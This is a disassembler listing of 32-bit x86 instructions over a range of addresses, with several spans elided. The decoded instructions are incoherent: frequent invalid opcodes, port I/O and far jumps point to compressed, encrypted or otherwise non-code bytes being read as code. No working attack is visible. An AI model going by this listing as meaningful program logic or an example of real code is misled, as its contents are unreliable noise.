  4211dc:	bound  ebp,QWORD PTR [esp+ecx*1-0x28]
  4211e0:	loope  0x42121a
  4211e2:	lods   al,BYTE PTR ds:[esi]
  4211e3:	sub    DWORD PTR [edi+0x7d09b7b1],ebx
  4211e9:	sub    DWORD PTR [edi+0xe],eax
  4211ec:	push   ds
  4211ed:	jo     0x4211f5
  4211ef:	jp     0x4211a3
  4211f1:	cmp    bl,BYTE PTR [ecx-0x26204b65]
  4211f7:	test   DWORD PTR [ebp+0x21],0x833e63d
  4211fe:	adc    BYTE PTR [eax+ebx*1],0x6
  421202:	push   edi
  421203:	and    al,0x11
  421205:	stos   DWORD PTR es:[edi],eax
  421206:	test   ebp,ebp
  421208:	and    al,0x21
  42120a:	jg     0x4211b2
  42120c:	test   DWORD PTR ds:0xf582bb,eax
	...
  421272:	add    BYTE PTR [eax],al
  421274:	sahf   
  421275:	pop    ds
  421276:	(bad)  
  421277:	test   DWORD PTR [edi-0x42800109],0x4b7ab32d
  421281:	adc    eax,0x619d9a80
  421286:	add    DWORD PTR [eax],eax
  421288:	add    eax,0xa0000001
  42128d:	cmc    
  42128e:	aas    
  42128f:	retf   0x8429
  421292:	les    edx,FWORD PTR [eax+0x203e4773]
  421298:	lea    eax,[edx+0x72ee427d]
  42129e:	pop    ebx
  42129f:	(bad)  
  4212a0:	aam    0xbf
  4212a2:	and    BYTE PTR [edx],ch
  4212a4:	punpckhdq mm3,mm0
  4212a7:	cwde   
  4212a8:	push   ss
  4212a9:	pushf  
  4212aa:	in     eax,dx
  4212ab:	pop    ds
  4212ac:	leave  
  4212ad:	idiv   DWORD PTR [edx]
  4212af:	mov    al,ds:0x5ede792d
  4212b4:	(bad)  
  4212b5:	loopne 0x4212e9
  4212b7:	pusha  
  4212b8:	xchg   esi,eax
  4212b9:	aam    0x49
  4212bb:	pop    esp
  4212bc:	(bad)  
  4212bd:	retf   
  4212be:	sub    al,0x2e
  4212c0:	imul   edx,DWORD PTR [ecx],0x20
  4212c3:	out    dx,eax
  4212c4:	mov    ds:0xbc4b1b65,al
  4212c9:	loopne 0x4212dc
  4212cb:	(bad)  
  4212cc:	adc    al,bl
  4212ce:	dec    edi
  4212cf:	sub    DWORD PTR [edx-0x9812891],ebx
  4212d5:	push   0x7
  4212d7:	popf   
  4212d8:	test   eax,0xc126dddf
  4212dd:	jns    0x421286
  4212df:	loopne 0x4212c7
  4212e1:	mov    eax,DWORD PTR [edi+eax*2+0x91666c3]
  4212e8:	stc    
  4212e9:	les    ebp,FWORD PTR [ebx-0x17]
  4212ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212ed:	js     0x421282
  4212ef:	scas   al,BYTE PTR es:[edi]
  4212f0:	mov    ds:0xd445842,al
  4212f5:	inc    ecx
  4212f6:	outs   dx,BYTE PTR ds:[esi]
  4212f7:	aaa    
  4212f8:	mov    esi,0xe8f8acfd
  4212fd:	sbb    bh,BYTE PTR [edi]
  4212ff:	add    al,0x13
  421301:	and    al,0x56
  421303:	mov    ecx,ebp
  421305:	or     eax,0xcf68812a
  42130a:	popa   
  42130b:	cmp    ch,bh
  42130d:	add    BYTE PTR [eax],dh
  42130f:	shl    DWORD PTR [ebx+0x1e],0x28
  421313:	fistp  DWORD PTR ds:0x6d58de7b
  421319:	sbb    DWORD PTR [edx],ecx
  42131b:	ret    0x2ac1
  42131e:	hlt    
  42131f:	test   BYTE PTR [eax],bl
  421321:	mov    ch,0x91
  421323:	imul   edi,ebx,0xffffff90
  421326:	imul   esp,DWORD PTR [edx],0x79
  421329:	sbb    ebp,DWORD PTR ds:0x23b3d037
  42132f:	gs lahf 
  421331:	cld    
  421332:	retf   
  421333:	jg     0x42137e
  421335:	iret   
  421336:	not    BYTE PTR [eax+0x6135f396]
  42133c:	(bad)  [edi+0x72]
  42133f:	sub    eax,0xfcf54137
  421344:	shr    BYTE PTR [eax-0x18],0xe7
  421348:	aam    0x33
  42134a:	or     al,0xf2
  42134c:	jb     0x42134c
  42134e:	gs mov ebx,0x2c911450
  421354:	(bad)  
  421355:	in     al,0xc6
  421357:	push   0x1567a54b
  42135c:	outs   dx,BYTE PTR ds:[esi]
  42135d:	add    BYTE PTR [edi+eiz*1+0x65],cl
  421361:	fbld   TBYTE PTR [edx-0x64]
  421364:	mov    edi,0xc9a671df
  421369:	cld    
  42136a:	lahf   
  42136b:	cli    
  42136c:	addr16 int3 
  42136e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42136f:	not    BYTE PTR [edi-0x48]
  421372:	dec    ecx
  421373:	repz jle 0x4212fb
  421376:	lea    ecx,[ecx-0x4d]
  421379:	mov    ebx,0x2c45c354
  42137e:	inc    ebp
  42137f:	mov    ah,0x16
  421381:	dec    edi
  421382:	sub    DWORD PTR [ebp-0x41],esi
  421385:	loop   0x42130b
  421387:	sbb    DWORD PTR [edx],edi
  421389:	sbb    BYTE PTR [edi+0x268bf248],al
  42138f:	dec    edx
  421390:	hlt    
	...
  4213f1:	add    BYTE PTR [eax],al
  4213f3:	add    dh,bh
  4213f5:	(bad)  
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp+0x24eff49f]
  421402:	mov    ch,0xac
  421404:	mov    ds:0x5000162,al
  421409:	add    DWORD PTR [eax],eax
  42140b:	add    BYTE PTR [eax],bh
  42140d:	jnp    0x4213ac
  42140f:	mov    eax,edx
  421411:	xor    eax,0x11375d39
  421416:	outs   dx,BYTE PTR ds:[esi]
  421417:	push   ebp
  421418:	imul   ecx,DWORD PTR [esi+0x1d8eb7bd],0x7bc640b9
  421422:	fnstsw WORD PTR [eax-0x4]
  421425:	push   edx
  421426:	aad    0xcf
  421428:	loopne 0x42143d
  42142a:	ficom  WORD PTR [ecx+0x3e11757a]
  421430:	jmp    0xb93:0x2487b4c4
  421437:	enter  0x495f,0x56
  42143b:	cmp    BYTE PTR [ebx],ch
  42143d:	add    eax,0x1eb2c091
  421442:	inc    edi
  421443:	daa    
  421444:	mov    ds:0x959e9595,eax
  421449:	and    DWORD PTR [edx],esi
  42144b:	inc    ebp
  42144c:	mov    bl,0x3a
  42144e:	push   edx
  42144f:	test   DWORD PTR [ecx-0x5e190321],edx
  421455:	sbb    BYTE PTR [ebx],bh
  421457:	push   ecx
  421458:	push   ss
  421459:	or     ch,bl
  42145b:	int    0x56
  42145d:	stos   DWORD PTR es:[edi],eax
  42145e:	inc    edx
  42145f:	inc    esp
  421460:	mov    ebp,0xba2ba04f
  421465:	dec    ecx
  421466:	test   eax,0x56f919b9
  42146b:	das    
  42146c:	fwait
  42146d:	dec    edx
  42146e:	shl    edx,cl
  421470:	mov    esi,0x43fa4850
  421475:	dec    esp
  421476:	lea    esp,[edx]
  421478:	push   cs
  421479:	sbb    al,0xd2
  42147b:	or     DWORD PTR [ebx-0x6d1e2035],0xb8857b58
  421485:	cdq    
  421486:	retf   
  421487:	pop    esp
  421488:	xchg   ebx,eax
  421489:	and    ecx,DWORD PTR [ecx]
  42148b:	push   es
  42148c:	repnz loopne 0x42147e
  42148f:	add    bl,0x18
  421492:	cli    
  421493:	nop
  421494:	ficom  WORD PTR [esi+0x2bee728e]
  42149a:	nop
  42149b:	data16 ja 0x4214bc
  42149e:	mov    ebx,edx
  4214a0:	das    
  4214a1:	or     al,0xb1
  4214a3:	xor    DWORD PTR [ebx+0x74],edi
  4214a6:	jbe    0x4214db
  4214a8:	imul   ebx,DWORD PTR [esi+0x7e],0x73
  4214ac:	cmp    BYTE PTR [ebx],bl
  4214ae:	mov    ds:0x655afd8b,al
  4214b3:	jne    0x421512
  4214b5:	sub    eax,0x7dbca6c2
  4214ba:	aaa    
  4214bb:	cmc    
  4214bc:	cmp    ebp,DWORD PTR [esi+eax*4]
  4214bf:	dec    edx
  4214c0:	mov    edi,0xe2506997
  4214c5:	sbb    DWORD PTR [eax+0x11],esi
  4214c8:	or     dh,ah
  4214ca:	int    0xca
  4214cc:	lods   eax,DWORD PTR ds:[esi]
  4214cd:	sub    ebp,DWORD PTR [edx+0x30]
  4214d0:	fldcw  WORD PTR [ebp+0x7c]
  4214d3:	push   0x3b
  4214d5:	addr16 inc edi
  4214d7:	gs push eax
  4214d9:	xchg   ebp,eax
  4214da:	mov    cl,0x41
  4214dc:	or     eax,DWORD PTR [edx-0x16]
  4214df:	and    DWORD PTR [ebp-0xd9d94b2],eax
  4214e5:	sbb    edi,DWORD PTR [edi+ebx*4+0x2b]
  4214e9:	and    ebp,DWORD PTR [eax]
  4214eb:	jb     0x4214dd
  4214ed:	shr    BYTE PTR [ecx+edx*4-0x65],0x24
  4214f2:	cwde   
  4214f3:	adc    dh,BYTE PTR [edi+0x6190f971]
  4214f9:	or     eax,0xeb8e05c4
  4214fe:	mov    ch,0x41
  421500:	add    DWORD PTR [ebp+0x2da176fe],edx
  421506:	push   edi
  421507:	mov    esp,0xca8337a6
  42150c:	(bad)  
  42150d:	push   ebx
  42150e:	imul   esp,DWORD PTR [esi],0xa5
	...
  421574:	(bad)  
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax+0x3c6b42b4],bp
  421582:	das    
  421583:	sbb    DWORD PTR [edi+0x5000163],esp
  421589:	add    DWORD PTR [eax],eax
  42158b:	add    BYTE PTR [ecx+0x4a],bl
  42158e:	mov    esp,0x98093c43
  421593:	inc    ebx
  421594:	lahf   
  421595:	arpl   WORD PTR [ebx+0x369cd143],bx
  42159b:	clc    
  42159c:	xor    dl,BYTE PTR [ebx-0x6f264cd5]
  4215a2:	lea    ebp,[ecx+0x257cb39c]
  4215a8:	loope  0x42155b
  4215aa:	call   DWORD PTR [eax-0x634588eb]
  4215b0:	adc    eax,DWORD PTR [ebx-0x66]
  4215b3:	es enter 0x1359,0x15
  4215b8:	jp     0x421632
  4215ba:	pop    eax
  4215bb:	mov    esi,0x3095fbbf
  4215c0:	(bad)  
  4215c1:	pop    edi
  4215c2:	inc    ebx
  4215c3:	aaa    
  4215c4:	push   0x16cf12d
  4215c9:	jo     0x42161f
  4215cb:	test   DWORD PTR [esi+0x5e],eax
  4215ce:	lock mov bl,0x55
  4215d1:	ins    DWORD PTR es:[edi],dx
  4215d2:	xor    ah,BYTE PTR [esi+ebp*4+0x7363110f]
  4215d9:	clc    
  4215da:	ja     0x42165b
  4215dc:	stc    
  4215dd:	xchg   DWORD PTR [eax+edi*4-0x5469f148],esi
  4215e4:	repz retf 0x6968
  4215e8:	mov    bl,0x1b
  4215ea:	mov    ch,0xa9
  4215ec:	daa    
  4215ed:	sbb    eax,0xa8afd678
  4215f2:	leave  
  4215f3:	xchg   esp,eax
  4215f4:	out    0xe,al
  4215f6:	mov    dh,0xe9
  4215f8:	push   esi
  4215f9:	mov    ebp,0xd1e51d93
  4215fe:	loop   0x4215c4
  421600:	adc    DWORD PTR [edx+0x2a01e9f5],edx
  421606:	jmp    0x7733:0xc93b6063
  42160d:	mov    dh,0x1e
  42160f:	(bad)  
  421610:	ins    DWORD PTR es:[edi],dx
  421611:	sbb    BYTE PTR [eax],bh
  421613:	in     eax,0xf0
  421615:	or     ecx,ebp
  421617:	xor    al,0x9e
  421619:	fdivr  st(7),st
  42161b:	sbb    ecx,DWORD PTR [esi+0x6141aadd]
  421621:	jmp    0x194172f4
  421626:	inc    esp
  421627:	pop    es
  421628:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421629:	ins    BYTE PTR es:[edi],dx
  42162a:	repz cli 
  42162c:	shl    DWORD PTR [eax+0x60],cl
  42162f:	(bad)  [esi]
  421631:	mov    edi,0x1ea10ef7
  421636:	cli    
  421637:	push   esp
  421638:	pop    esi
  421639:	mov    eax,ds:0x235a30ea
  42163e:	sahf   
  42163f:	mov    ch,0x20
  421641:	mov    edi,0x322e28aa
  421646:	adc    cl,bh
  421648:	pslld  mm7,QWORD PTR [ecx]
  42164b:	add    eax,DWORD PTR [esp+eiz*4+0x4d]
  42164f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421650:	push   ss
  421651:	push   ss
  421652:	or     BYTE PTR [edx-0x27732298],dl
  421658:	in     al,dx
  421659:	fbstp  TBYTE PTR [ebx-0x48]
  42165c:	jp     0x4216b0
  42165e:	cmp    DWORD PTR [edi+edx*2],esp
  421661:	fmul   DWORD PTR [ebx+edx*4-0x24ac68e]
  421668:	pusha  
  421669:	std    
  42166a:	pop    ds
  42166b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42166c:	and    dh,bh
  42166e:	rcr    DWORD PTR [edx],0xad
  421671:	jmp    0x3e3:0xea82ce12
  421678:	loop   0x4216af
  42167a:	jb     0x421644
  42167c:	mov    bl,bh
  42167e:	sub    DWORD PTR [edi-0x70ca627f],ecx
  421684:	mov    dl,0x77
  421686:	dec    esp
  421687:	lods   eax,DWORD PTR ds:[esi]
  421688:	mov    bh,0x82
  42168a:	jl     0x42169a
  42168c:	loope  0x4216ba
  42168e:	js     0x4216bd
  421690:	in     eax,0x0
	...
  4216f2:	add    BYTE PTR [eax],al
  4216f4:	stos   DWORD PTR es:[edi],eax
  4216f5:	sub    al,0xed
  4216f7:	stos   BYTE PTR es:[edi],al
  4216f8:	out    dx,eax
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	or     ch,ch
  421702:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421703:	aam    0xac
  421705:	add    DWORD PTR fs:[eax],eax
  421708:	add    eax,0x8e000001
  42170d:	out    dx,eax
  42170e:	push   ds
  42170f:	rcr    BYTE PTR [ebp-0x5b],1
  421712:	(bad)  
  421713:	imul   ecx,DWORD PTR [edx],0x18
  421716:	xor    DWORD PTR [eax+0x5d114092],esi
  42171c:	push   esp
  42171d:	push   edi
  42171e:	cmp    BYTE PTR [ebx+esi*1-0x1b82b03d],dh
  421725:	xchg   ecx,eax
  421726:	loopne 0x4216e6
  421728:	test   bh,al
  42172a:	and    al,0x6a
  42172c:	pop    ebx
  42172d:	outs   dx,DWORD PTR ds:[esi]
  42172e:	popf   
  42172f:	sar    BYTE PTR [ebx+0x23],0x12
  421733:	and    DWORD PTR [edi+0x489688ba],ebp
  421739:	jne    0x42179a
  42173b:	push   ecx
  42173c:	mov    cl,0x80
  42173e:	add    DWORD PTR [ebp+0x74cb7829],0xd865967a
  421748:	add    ebx,DWORD PTR [edx+eax*1+0x60f29793]
  42174f:	fcom   QWORD PTR [ecx]
  421751:	dec    edx
  421752:	mov    dh,0x92
  421754:	cs call 0x34ed:0xbfc5005f
  42175c:	add    al,0x27
  42175e:	mov    ebx,0xae3d71fb
  421763:	push   ebp
  421764:	pop    ecx
  421765:	dec    ebx
  421766:	outs   dx,DWORD PTR ds:[esi]
  421767:	gs and al,0x61
  42176a:	jle    0x42174d
  42176c:	jno    0x421730
  42176e:	mov    edi,0x7211b178
  421773:	jge    0x421702
  421775:	inc    eax
  421776:	jno    0x4217d9
  421778:	pop    ebx
  421779:	aad    0x14
  42177b:	push   cs
  42177c:	nop
  42177d:	dec    edi
  42177e:	aam    0x39
  421780:	lock sbb al,0x19
  421783:	data16 cmp BYTE PTR [ebx+ebp*2+0x232417b],al
  42178b:	xor    esp,esp
  42178d:	add    BYTE PTR [ecx],0x86
  421790:	dec    ecx
  421791:	cmp    ecx,DWORD PTR [esi+0x5b]
  421794:	mov    ah,0x41
  421796:	jp     0x42177f
  421798:	(bad)  
  421799:	mov    fs,ebp
  42179b:	ret    0x29ca
  42179e:	out    dx,al
  42179f:	dec    esp
  4217a0:	add    BYTE PTR ds:0x79817a34,al
  4217a6:	push   eax
  4217a7:	or     DWORD PTR [edi-0x3f],ecx
  4217aa:	(bad)  [edx-0x59]
  4217ad:	in     al,dx
  4217ae:	and    eax,0x8a9d459a
  4217b3:	outs   dx,DWORD PTR ds:[esi]
  4217b4:	fcom   st(6)
  4217b6:	and    eax,0xa065c8c
  4217bb:	dec    edx
  4217bc:	push   cs
  4217bd:	jecxz  0x421807
  4217bf:	fadd   QWORD PTR [esi+0x36]
  4217c2:	gs cmp dl,bl
  4217c5:	push   ds
  4217c6:	pushf  
  4217c7:	loope  0x4217b5
  4217c9:	or     edi,edi
  4217cb:	jecxz  0x421750
  4217cd:	jb     0x421815
  4217cf:	ret    0x59a3
  4217d2:	fnstcw WORD PTR [esi+0x2dac0a36]
  4217d8:	mov    BYTE PTR es:[ecx-0x27],bh
  4217dc:	add    eax,0x56126974
  4217e1:	xchg   ebx,eax
  4217e2:	add    DWORD PTR [edx],esi
  4217e4:	and    DWORD PTR [ecx-0x70],edx
  4217e7:	test   al,0xdf
  4217e9:	in     eax,0xec
  4217eb:	pusha  
  4217ec:	fistp  DWORD PTR [esi]
  4217ee:	add    dl,dl
  4217f0:	mov    edx,0xb784800
  4217f5:	jecxz  0x421873
  4217f7:	and    eax,0x692c5f1e
  4217fc:	out    0xf0,al
  4217fe:	vsubsd xmm4,xmm7,QWORD PTR [esi+0x7e]
  421803:	out    0xf4,al
  421805:	les    ecx,FWORD PTR [edx]
  421807:	cli    
  421808:	std    
  421809:	int3   
  42180a:	xor    eax,0x4e822c89
  42180f:	rcl    DWORD PTR [esi+0x0],1
	...
  421871:	add    BYTE PTR [eax],al
  421873:	add    cl,dl
  421875:	mov    al,ds:0xf9f9e0b9
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	xor    al,0xd8
  421882:	mov    al,ds:0x165b16d
  421887:	add    BYTE PTR ds:0xe7000001,al
  42188d:	outs   dx,DWORD PTR ds:[esi]
  42188e:	xchg   ebx,eax
  42188f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421890:	pop    ds
  421891:	imul   ebp,eax,0x6f7714f7
  421897:	jl     0x421873
  421899:	into   
  42189a:	and    esp,DWORD PTR [edx]
  42189c:	pop    ss
  42189d:	inc    esp
  42189e:	pop    di
  4218a1:	(bad)  
  4218a2:	jmp    0x6d2d4ada
  4218a7:	mov    edx,0x966ce604
  4218ac:	sar    DWORD PTR [esi],0xe6
  4218af:	push   cs
  4218b0:	jne    0x421837
  4218b2:	pushf  
  4218b3:	in     eax,dx
  4218b4:	push   ebx
  4218b5:	xor    edx,DWORD PTR [esi]
  4218b7:	sub    esi,edx
  4218b9:	stos   DWORD PTR es:[di],eax
  4218bb:	adc    eax,0x1e3f7dd0
  4218c0:	add    ch,ch
  4218c2:	popa   
  4218c3:	dec    esp
  4218c4:	add    BYTE PTR [eax+0x42],0xd8
  4218c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218c9:	ins    BYTE PTR es:[edi],dx
  4218ca:	es pusha 
  4218cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218cd:	lods   al,BYTE PTR ds:[esi]
  4218ce:	xchg   ecx,eax
  4218cf:	mov    dl,0x3f
  4218d1:	xor    BYTE PTR [ecx],dh
  4218d3:	inc    ecx
  4218d4:	jb     0x421867
  4218d6:	cdq    
  4218d7:	mov    eax,0x178bc757
  4218dc:	mov    DWORD PTR [esi-0x79],ebx
  4218df:	outs   dx,DWORD PTR ds:[esi]
  4218e0:	push   ebx
  4218e1:	mov    ds:0x702125a6,al
  4218e6:	and    esp,DWORD PTR [ebp+0x12c0f081]
  4218ec:	mov    BYTE PTR [edi+eiz*4],bl
  4218ef:	xchg   edx,eax
  4218f0:	daa    
  4218f1:	lahf   
  4218f2:	and    al,0x50
  4218f4:	xchg   edi,eax
  4218f5:	xor    al,0x1d
  4218f7:	mov    ecx,0x3374104d
  4218fc:	ret    0x8c96
  4218ff:	retf   0x1081
  421902:	cmp    eax,0x286334
  421907:	and    ebx,DWORD PTR [eax]
  421909:	mov    dh,0xee
  42190b:	shl    DWORD PTR [edx-0x73],cl
  42190e:	ins    DWORD PTR es:[edi],dx
  42190f:	mov    edx,0xfdd4b7ec
  421914:	adc    BYTE PTR [edx],0xf1
  421917:	bound  eax,QWORD PTR [edi-0x20]
  42191a:	jne    0x4218f0
  42191c:	push   ebx
  42191d:	in     eax,0x98
  42191f:	aaa    
  421920:	and    eax,DWORD PTR [ecx-0x44]
  421923:	sbb    DWORD PTR [ebp-0x3a3f8f13],esi
  421929:	loope  0x42199e
  42192b:	ficom  DWORD PTR [ecx-0x29605afa]
  421931:	aam    0xa2
  421933:	adc    dl,ah
  421935:	daa    
  421936:	in     al,0x6c
  421938:	aas    
  421939:	mov    bl,0x43
  42193b:	mov    ds:0xd379f7cf,eax
  421940:	not    BYTE PTR [ecx+0x7f060011]
  421946:	out    dx,al
  421947:	dec    ebp
  421948:	dec    ecx
  421949:	ret    0x7c38
  42194c:	push   ebx
  42194d:	xor    eax,0x143cd2a6
  421952:	push   0x3
  421954:	or     bh,BYTE PTR [edi+ebp*1]
  421957:	retf   0x8738
  42195a:	aas    
  42195b:	add    BYTE PTR ds:0xedc37494,al
  421961:	xchg   esi,eax
  421962:	loopne 0x421974
  421964:	lock xchg ecx,eax
  421966:	xlat   BYTE PTR ds:[ebx]
  421967:	lock jno 0x42198c
  42196a:	xchg   esi,eax
  42196b:	test   eax,0x995e3a45
  421970:	sbb    DWORD PTR fs:[edx],edx
  421973:	aaa    
  421974:	loope  0x421904
  421976:	test   BYTE PTR [esi+0x3f],al
  421979:	les    esp,FWORD PTR [esi+0x13365da3]
  42197f:	(bad)
  421982:	popf   
  421983:	test   DWORD PTR [esi],ebp
  421985:	std    
  421986:	add    DWORD PTR [edi+0x48],eax
  421989:	mov    bh,0xfb
  42198b:	or     al,0x91
  42198d:	fisttp QWORD PTR [ecx-0x55]
  421990:	pop    ebx
	...
  4219f1:	add    BYTE PTR [eax],al
  4219f3:	add    dh,bh
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	sbb    edi,DWORD PTR [edx]
  421a02:	pop    edx
  421a03:	and    DWORD PTR [esi+0x5000166],esi
  421a09:	add    DWORD PTR [eax],eax
  421a0b:	add    BYTE PTR [edx-0x56f3be37],dl
  421a11:	rcr    BYTE PTR [edi+0x2d57eba9],cl
  421a17:	mov    ebp,0x4a0796ac
  421a1c:	(bad)  
  421a1d:	dec    ebx
  421a1e:	ror    BYTE PTR [ebx-0x7b29cd3b],cl
  421a24:	out    dx,eax
  421a25:	jl     0x4219e7
  421a27:	ss add al,0xf7
  421a2a:	ss cdq 
  421a2c:	adc    bl,BYTE PTR [ebx+0x1a968f59]
  421a32:	retf   
  421a33:	xor    bl,BYTE PTR [esi]
  421a35:	out    dx,eax
  421a36:	gs nop
  421a38:	sbb    dl,BYTE PTR [esi+esi*1+0x67494a1]
  421a3f:	call   0x43f5a262
  421a44:	pushf  
  421a45:	loopne 0x421a10
  421a47:	sbb    al,0x97
  421a49:	xor    cl,0x33
  421a4c:	lds    edi,FWORD PTR [eax]
  421a4e:	mov    ds:0xce9c7217,eax
  421a53:	aam    0xa4
  421a55:	cmp    ah,al
  421a57:	in     al,0x79
  421a59:	sbb    eax,0x74ab68f0
  421a5e:	jae    0x4219fb
  421a60:	mov    esi,0xe3d5f1bc
  421a65:	cmp    DWORD PTR [ecx],ecx
  421a67:	mov    eax,0x2f5be4a8
  421a6c:	mov    dl,0x3b
  421a6e:	cwde   
  421a6f:	rcl    al,1
  421a71:	(bad)  
  421a72:	jne    0x421a33
  421a74:	jmp    0x421ade
  421a76:	inc    ebp
  421a77:	outs   dx,DWORD PTR cs:[esi]
  421a79:	cmc    
  421a7a:	lods   ax,WORD PTR ds:[esi]
  421a7c:	lds    ecx,FWORD PTR [ecx]
  421a7e:	hlt    
  421a7f:	repz mov al,ds:0x6c7f0b5f
  421a85:	add    BYTE PTR [ebx-0x11ad50ac],bl
  421a8b:	and    al,0x38
  421a8d:	jne    0x421a88
  421a8f:	pop    ds
  421a90:	jmp    0xb090:0xa5dd40b3
  421a97:	fs inc eax
  421a99:	adc    eax,0x2ba08682
  421a9e:	out    dx,al
  421a9f:	popa   
  421aa0:	mov    eax,0xee58381f
  421aa5:	xor    al,0x13
  421aa7:	add    DWORD PTR [ecx],ebp
  421aa9:	xor    BYTE PTR [esi+0x5],ah
  421aac:	bound  ecx,QWORD PTR [eax+edi*2-0x42]
  421ab0:	push   ss
  421ab1:	and    DWORD PTR [ebx],0x8497e83e
  421ab7:	ins    BYTE PTR es:[edi],dx
  421ab8:	push   0x4b7b519e
  421abd:	jb     0x421ad6
  421abf:	jo     0x421ad3
  421ac1:	mov    al,0x98
  421ac3:	jnp    0x421ab5
  421ac5:	and    BYTE PTR [ecx+0xd],ch
  421ac8:	jp     0x421a7c
  421aca:	call   0xff09:0x863275cd
  421ad1:	cmp    al,0xb7
  421ad3:	cmp    eax,0x6d98e157
  421ad8:	adc    BYTE PTR [edi-0x26f7624e],dl
  421ade:	inc    eax
  421adf:	ds ret 
  421ae1:	or     eax,0x5d71d22d
  421ae6:	mov    esi,0xc7c85b2
  421aeb:	jne    0x421b50
  421aed:	jnp    0x421b03
  421aef:	and    ecx,DWORD PTR [ebx]
  421af1:	mov    eax,ds:0xd92b6fa4
  421af6:	and    eax,0xf554ff2a
  421afb:	mov    esp,0x95b4fdec
  421b00:	and    ebp,DWORD PTR [eax+esi*1+0x75]
  421b04:	cmp    esp,ecx
  421b06:	sahf   
  421b07:	push   esp
  421b08:	mov    esp,0xfe82128d
  421b0d:	in     eax,0xf6
  421b0f:	and    esi,DWORD PTR [esi+0x0]
	...
  421b71:	add    BYTE PTR [eax],al
  421b73:	add    BYTE PTR [esi],dl
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     dl,BYTE PTR [edx]
  421b81:	daa    
  421b82:	icebp  
  421b83:	pusha  
  421b84:	mov    ebx,0x5000167
  421b89:	add    DWORD PTR [eax],eax
  421b8b:	add    BYTE PTR [edi],al
  421b8d:	jne    0x421b24
  421b8f:	inc    ebx
  421b90:	mov    ah,0x9e
  421b92:	jno    0x421b69
  421b94:	seta   bh
  421b97:	lods   eax,DWORD PTR ds:[esi]
  421b98:	(bad)  
  421b99:	(bad)  
  421b9a:	mov    ecx,0x1fe2490c
  421b9f:	jne    0x421c0d
  421ba1:	ret    0x9ba4
  421ba4:	sbb    dl,BYTE PTR [ecx]
  421ba6:	mov    edx,0xa535839
  421bab:	js     0x421bbd
  421bad:	pop    esp
  421bae:	jge    0x421c28
  421bb0:	dec    esp
  421bb1:	jns    0x421c02
  421bb3:	jmp    0x6388:0x8ca44abf
  421bba:	or     ebx,esp
  421bbc:	bound  ecx,QWORD PTR [edi-0x4bc7450]
  421bc2:	xor    edx,0x52f0229c
  421bc8:	iret   
  421bc9:	and    BYTE PTR [edi],0xb8
  421bcc:	jno    0x421c15
  421bce:	popf   
  421bcf:	lods   eax,DWORD PTR ds:[esi]
  421bd0:	adc    al,BYTE PTR [edx+0x588a0c81]
  421bd6:	imul   edi,edx,0x2e
  421bd9:	add    eax,0x86b0344a
  421bde:	imul   esp,ebx,0x285baaa2
  421be4:	es mov cl,0x51
  421be7:	out    dx,al
  421be8:	into   
  421be9:	sub    al,0x2b
  421beb:	ret    0xf9dc
  421bee:	dec    ecx
  421bef:	gs das 
  421bf1:	push   eax
  421bf2:	ins    BYTE PTR es:[edi],dx
  421bf3:	or     DWORD PTR [edx+0x4b7e9f76],ebp
  421bf9:	jo     0x421c75
  421bfb:	outs   dx,BYTE PTR ds:[esi]
  421bfc:	scas   eax,DWORD PTR es:[edi]
  421bfd:	cli    
  421bfe:	bound  ebp,QWORD PTR [esi+edi*2+0x3db04af4]
  421c05:	pusha  
  421c06:	rcr    BYTE PTR [ecx],1
  421c08:	test   eax,0x88e7fac5
  421c0d:	ffreep st(0)
  421c0f:	cmp    eax,DWORD PTR fs:[ebx-0x59]
  421c13:	fdiv   DWORD PTR [ebx+0x60]
  421c16:	and    DWORD PTR [ebx-0x13],0xffffff87
  421c1a:	add    BYTE PTR ds:0xd56771a5,al
  421c20:	mov    al,0xd1
  421c22:	or     DWORD PTR [ecx+0x4221c935],ecx
  421c28:	fcomp  QWORD PTR [esp+eax*1-0x751abe1c]
  421c2f:	jae    0x421bf4
  421c31:	bound  ebp,QWORD PTR [ecx-0x7a]
  421c34:	lea    esi,[ebp+0x34]
  421c37:	fisubr DWORD PTR [ecx+eiz*8]
  421c3a:	lea    ebp,[ebp-0x1ac79246]
  421c40:	push   edi
  421c41:	jno    0x421c5a
  421c43:	sbb    ah,BYTE PTR [esi-0xc]
  421c46:	push   ss
  421c47:	(bad)  
  421c49:	sub    BYTE PTR [edi+0x231b6b46],al
  421c4f:	cmp    al,0x15
  421c51:	push   ss
  421c52:	test   al,0x51
  421c54:	jns    0x421c4d
  421c56:	push   edx
  421c57:	mov    DWORD PTR [eax-0x5d],0xe1f0c544
  421c5e:	jl     0x421cac
  421c60:	xlat   BYTE PTR ds:[ebx]
  421c61:	je     0x421cc0
  421c63:	lock ins DWORD PTR es:[edi],dx
  421c65:	cmp    BYTE PTR [eax],bh
  421c67:	pop    ebx
  421c68:	ror    BYTE PTR [edx],1
  421c6a:	data16 and cl,BYTE PTR [ecx+0x1a]
  421c6e:	jo     0x421cc5
  421c70:	(bad)  
  421c71:	mov    eax,0x27f7c854
  421c76:	sar    DWORD PTR [ecx-0x21cc1f3d],0x2b
  421c7d:	xchg   edx,eax
  421c7e:	push   edi
  421c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c80:	mov    ah,0x23
  421c82:	mov    ds:0x343af961,eax
